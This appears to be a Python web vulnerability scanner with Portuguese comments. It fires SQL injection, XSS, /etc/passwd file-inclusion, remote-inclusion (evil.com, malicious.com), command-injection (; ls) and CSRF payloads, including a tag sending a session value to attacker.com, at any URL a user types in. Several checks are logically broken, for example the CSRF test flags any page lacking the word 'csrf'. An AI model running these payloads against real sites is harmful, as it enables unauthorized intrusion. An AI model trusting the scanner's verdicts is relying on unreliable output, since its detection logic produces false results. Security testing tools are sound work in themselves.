import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse


# Função para garantir que a URL tenha o formato correto
def sanitize_url(url):
    # Verifica se a URL começa com http:// ou https://
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "http://" + url

    # Remover possíveis caracteres malformados da URL
    url = url.rstrip('/')  # Remove barra final para evitar duplicação de barras

    # Verifica se a URL tem um host válido
    parsed_url = urlparse(url)
    if not parsed_url.netloc:
        raise ValueError("URL fornecida é inválida.")

    return url


# Função para verificar se há vulnerabilidade de SQL Injection
def check_sql_injection(url):
    payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR "a"="a']
    vulnerable = False

    print(f"\nVerificando vulnerabilidade de SQL Injection em {url}")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and ("error" in response.text.lower() or "syntax" in response.text.lower()):
                print(f"[!] Possível vulnerabilidade de SQL Injection detectada em {test_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[!] Erro ao acessar a URL {test_url}: {e}")

    if not vulnerable:
        print("[*] Nenhuma vulnerabilidade de SQL Injection detectada.")


# Função para verificar se há vulnerabilidade de XSS
def check_xss(url):
    payloads = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">']
    vulnerable = False

    print(f"\nVerificando vulnerabilidade de XSS em {url}")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and payload in response.text:
                print(f"[!] Possível vulnerabilidade de XSS detectada em {test_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[!] Erro ao acessar a URL {test_url}: {e}")

    if not vulnerable:
        print("[*] Nenhuma vulnerabilidade de XSS detectada.")


# Função para verificar se há vulnerabilidade de LFI (Local File Inclusion)
def check_lfi(url):
    payloads = ["../../etc/passwd", "../../../etc/passwd", "/etc/passwd"]
    vulnerable = False

    print(f"\nVerificando vulnerabilidade de LFI em {url}")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and "root:x" in response.text:
                print(f"[!] Possível vulnerabilidade de LFI detectada em {test_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[!] Erro ao acessar a URL {test_url}: {e}")

    if not vulnerable:
        print("[*] Nenhuma vulnerabilidade de LFI detectada.")


# Função para verificar se há vulnerabilidade de RFI (Remote File Inclusion)
def check_rfi(url):
    payloads = ["http://malicious.com/malicious_file.php", "http://evil.com/malicious_file.php"]
    vulnerable = False

    print(f"\nVerificando vulnerabilidade de RFI em {url}")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and "malicious" in response.text:
                print(f"[!] Possível vulnerabilidade de RFI detectada em {test_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[!] Erro ao acessar a URL {test_url}: {e}")

    if not vulnerable:
        print("[*] Nenhuma vulnerabilidade de RFI detectada.")


# Função para verificar vulnerabilidade de Command Injection
def check_command_injection(url):
    payloads = ["; ls", "| ls", "`ls`"]
    vulnerable = False

    print(f"\nVerificando vulnerabilidade de Command Injection em {url}")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and "bin" in response.text:
                print(f"[!] Possível vulnerabilidade de Command Injection detectada em {test_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[!] Erro ao acessar a URL {test_url}: {e}")

    if not vulnerable:
        print("[*] Nenhuma vulnerabilidade de Command Injection detectada.")


# Função para verificar vulnerabilidade de CSRF
def check_csrf(url):
    payloads = ["<img src='http://attacker.com/attack?session=12345'>",
                "<form action='http://attacker.com/attack' method='POST'>"]
    vulnerable = False

    print(f"\nVerificando vulnerabilidade de CSRF em {url}")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200 and "csrf" not in response.text:
                print(f"[!] Possível vulnerabilidade de CSRF detectada em {test_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[!] Erro ao acessar a URL {test_url}: {e}")

    if not vulnerable:
        print("[*] Nenhuma vulnerabilidade de CSRF detectada.")


# Função principal que chama as verificações
def scan_vulnerabilities(url):
    print(f"\nEscaneando vulnerabilidades na URL: {url}\n")
    check_sql_injection(url)
    check_xss(url)
    check_lfi(url)
    check_rfi(url)
    check_command_injection(url)
    check_csrf(url)



# Entrada do usuário
if __name__ == "__main__":
    url = input("Digite a URL da página a ser escaneada (ex: http://www.example.com/pagina_vulneravel): ")

    try:
        # Sanitizar a URL fornecida
        url = sanitize_url(url)

        # Iniciar o escaneamento
        scan_vulnerabilities(url)
    except ValueError as e:
        print(f"[!] Erro: {e}")

print(f"\nTeste o mesmo link em diversas Subcategoria para encontrar vulnerabilidades ")

